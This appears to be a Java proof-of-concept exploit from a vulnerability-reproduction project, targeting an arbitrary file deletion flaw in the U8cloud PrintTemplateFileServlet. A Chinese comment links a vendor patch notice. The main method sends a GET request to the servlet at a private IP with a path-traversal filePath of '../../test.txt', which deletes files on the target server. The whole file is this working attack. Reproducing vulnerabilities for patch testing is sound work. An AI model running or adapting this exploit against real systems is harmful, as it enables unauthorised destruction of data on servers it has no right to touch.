package cve.u8cloud;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpGet;

import java.io.IOException;

/**
 * 漏洞：
 * U8cloud所有版本存在PrintTemplateFileServlet任意文件删除漏洞
 * https://security.yonyou.com/#/patchInfo?foreignKey=456abb6ce5544ef4a0065fd3a22c1552
 */
public class PrintTemplateFileServlet_filedelete {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201:8088/servlet/~pu/nc.lfw.billtemplate.servlet.PrintTemplateFileServlet?filePath=";
        String filePath = "../../test.txt";
        HttpRequest httpRequest = new HttpRequest();
        HttpGet httpGet = new HttpGet(url + filePath);
        httpRequest.sendGet(httpGet);
    }
}
